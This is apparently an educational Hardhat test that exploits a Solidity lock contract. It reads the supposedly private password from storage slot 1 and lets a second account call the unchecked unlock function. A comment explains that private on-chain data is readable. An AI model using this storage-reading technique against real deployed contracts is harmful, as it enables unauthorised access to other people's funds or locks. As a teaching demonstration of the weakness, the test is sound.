const {expect} = require('chai');
const { ethers } = require('hardhat');
const {loadFixture} = require('@nomicfoundation/hardhat-toolbox/network-helpers');

describe("Break Privacy",()=>{
    async function setup(){
        let contract = await ethers.getContractFactory('AlicesLock')
        let [alice,bob] = await ethers.getSigners()
        let lockContract = await contract.connect(alice).deploy(ethers.encodeBytes32String("Mysecrect String"))
        return {lockContract,alice,bob}
    }

    it("Bob Can Has Successfully Unlocked The Contract", async ()=>{
        const {lockContract,alice,bob} = await loadFixture(setup)
        try {
            let password = await ethers.provider.getStorage(await lockContract.getAddress(),1)
            // before breaking the lock. The Lock should be true
            
            expect(await lockContract.ifLocked()).to.be.equal(true)
            
            /**
             *  Never store private data onchain
             *  In Ethereum SmartContract State Variable Follows Storage Slot By Indexing
             *  As We have fetched The password from storage slot at index 1 
             *  By looking at the storage slot
             *  And The unlock function in AlicesLock 
             *  Also Does'nt Have Any checks So Anyone Can Unlock It
             * 
             */

            // Let unlock the using Bob account 

            await lockContract.connect(bob).unlock(password)

            // After the above Call it should be unlocked 
            // And ifLocked() should return false 
            expect(await lockContract.ifLocked()).to.be.equal(false)
        } catch (error) {
            console.log(error)
        }   
    });
})